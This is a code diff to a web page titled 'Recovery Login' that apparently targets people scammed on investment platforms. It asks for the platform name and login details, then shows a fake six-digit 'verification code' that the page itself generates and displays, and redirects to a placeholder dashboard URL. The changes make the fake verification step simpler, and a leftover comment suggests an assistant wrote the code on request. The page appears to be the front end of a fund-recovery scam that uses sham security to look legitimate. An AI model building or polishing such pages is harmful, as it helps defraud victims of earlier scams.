@@ -69,7 +69,7 @@
       font-weight: 400;
     }
 
-    .cta-btn, .confirm-btn, .login-btn, .code-btn {
+    .cta-btn, .verify-btn, .login-btn, .code-btn {
       background: linear-gradient(90deg, var(--primary), var(--secondary));
       color: #fff;
       border: none;
@@ -84,7 +84,7 @@
     }
 
     .cta-btn:hover, .cta-btn:focus,
-    .confirm-btn:hover, .confirm-btn:focus,
+    .verify-btn:hover, .verify-btn:focus,
     .login-btn:hover, .login-btn:focus,
     .code-btn:hover, .code-btn:focus {
       transform: scale(1.06);
@@ -128,56 +128,6 @@
       border: 1.8px solid var(--primary);
     }
 
-    .code-popup {
-      position: fixed;
-      z-index: 1000;
-      left: 0; right: 0; top: 0; bottom: 0;
-      background: rgba(0,0,0,0.56);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .code-popup-content {
-      background: #fff;
-      padding: 2rem 2.2rem;
-      border-radius: 1rem;
-      text-align: center;
-      min-width: 260px;
-      box-shadow: 0 8px 40px 0 rgba(46,91,255,0.14);
-      color: var(--primary);
-      font-family: 'Inter', Arial, sans-serif;
-    }
-
-    .popup-code {
-      font-size: 2rem;
-      font-weight: 800;
-      letter-spacing: 0.15em;
-      margin: 1.1rem 0 1.3rem 0;
-      color: var(--secondary);
-      background: #f3f4f6;
-      padding: 0.7rem 1.6rem;
-      border-radius: 0.6rem;
-      display: inline-block;
-      user-select: all;
-    }
-
-    .copy-btn {
-      background: var(--primary);
-      color: #fff;
-      border: none;
-      border-radius: 999px;
-      padding: 0.5rem 1.6rem;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      margin-bottom: 1.1rem;
-      transition: background 0.18s;
-    }
-    .copy-btn:hover {
-      background: var(--secondary);
-    }
-
     .error-message {
       color: #e53e3e;
       font-size: 0.95rem;
@@ -194,17 +144,9 @@
       .card h1 {
         font-size: 1.4rem;
       }
-      .cta-btn, .confirm-btn, .login-btn, .code-btn {
+      .cta-btn, .verify-btn, .login-btn, .code-btn {
         font-size: 1rem;
         padding: 0.7rem 1.5rem;
-      }
-      .code-popup-content {
-        min-width: 180px;
-        padding: 1.1rem 0.8rem;
-      }
-      .popup-code {
-        font-size: 1.2rem;
-        padding: 0.4rem 0.6rem;
       }
     }
   </style>
@@ -225,10 +167,10 @@
       <h1>Recovery Login</h1>
       <form id="platform-form">
         <div class="input-group">
-          <label for="platform-input">Name of Investment Platform</label>
+          <label for="platform-input">Name of Investment Platform (you got scammed)</label>
           <input id="platform-input" name="platform" type="text" placeholder="e.g. Binance, Coinbase, etc." required />
         </div>
-        <button type="submit" class="confirm-btn">Confirm</button>
+        <button type="submit" class="verify-btn">Verify</button>
       </form>
     </div>
 
@@ -253,42 +195,25 @@
       <h1>Verification Code</h1>
       <form id="code-form">
         <div class="input-group">
-          <label for="code-input">Paste the code sent to you</label>
+          <label for="code-input">Enter the 6-digit code</label>
           <input id="code-input" name="code" type="text" placeholder="Enter code" required maxlength="6" minlength="6" />
         </div>
         <button type="submit" class="code-btn">Access Dashboard</button>
       </form>
-    </div>
-  </div>
-
-  <!-- Popup for displaying code to copy -->
-  <div class="code-popup hidden" id="popup">
-    <div class="code-popup-content">
-      <div>Your verification code:</div>
-      <div class="popup-code" id="popup-code"></div>
-      <button class="copy-btn" id="copy-btn">Copy Code</button>
-      <div style="margin-top:0.7rem;">
-        <button class="code-btn" id="close-popup-btn">Continue</button>
-      </div>
+      <div id="code-hint" style="margin-top:1rem;color:var(--secondary);font-weight:600;"></div>
     </div>
   </div>
 
   <script>
+    // Set your dashboard URL here
+    const DASHBOARD_URL = "YOUR_DASHBOARD_URL_HERE"; // <-- replace with your actual dashboard URL
+
     // Utility functions
     function showCard(cardId) {
       for (const id of ['welcome-card', 'platform-card', 'login-card', 'code-card']) {
         document.getElementById(id).classList.add('hidden');
       }
       document.getElementById(cardId).classList.remove('hidden');
-    }
-
-    function showPopup(code) {
-      document.getElementById('popup-code').textContent = code;
-      document.getElementById('popup').classList.remove('hidden');
-    }
-
-    function hidePopup() {
-      document.getElementById('popup').classList.add('hidden');
     }
 
     // Step 1: Welcome -> Platform Name
@@ -302,29 +227,14 @@
       showCard('login-card');
     };
 
-    // Step 3: Credentials -> Show popup code
+    // Step 3: Credentials -> Verification Code
     let generatedCode = "";
     document.getElementById('login-form').onsubmit = function(e) {
       e.preventDefault();
-      // Generate a 6-digit code
+      // Generate a 6-digit code and show it as a hint (for demo/testing; in real-world, send via email)
       generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-      showPopup(generatedCode);
-    };
-
-    // Copy code to clipboard
-    document.getElementById('copy-btn').onclick = function() {
-      const code = document.getElementById('popup-code').textContent;
-      navigator.clipboard.writeText(code);
-      document.getElementById('copy-btn').textContent = "Copied!";
-      setTimeout(() => {
-        document.getElementById('copy-btn').textContent = "Copy Code";
-      }, 1500);
-    };
-
-    // Continue from popup to code input
-    document.getElementById('close-popup-btn').onclick = function() {
-      hidePopup();
       showCard('code-card');
+      document.getElementById('code-hint').textContent = "Your verification code: " + generatedCode;
     };
 
     // Step 4: Code input -> Validate and move to dashboard
@@ -332,9 +242,8 @@
       e.preventDefault();
       const inputCode = document.getElementById('code-input').value;
       if (inputCode === generatedCode) {
-        // Access granted, next step is dashboard (to be implemented)
-        alert("Access granted! (Dashboard will be shown next as per your instructions.)");
-        // Here you can trigger the dashboard logic or redirect
+        // Redirect to dashboard
+        window.location.href = DASHBOARD_URL;
       } else {
         alert("Incorrect code. Please try again.");
       }
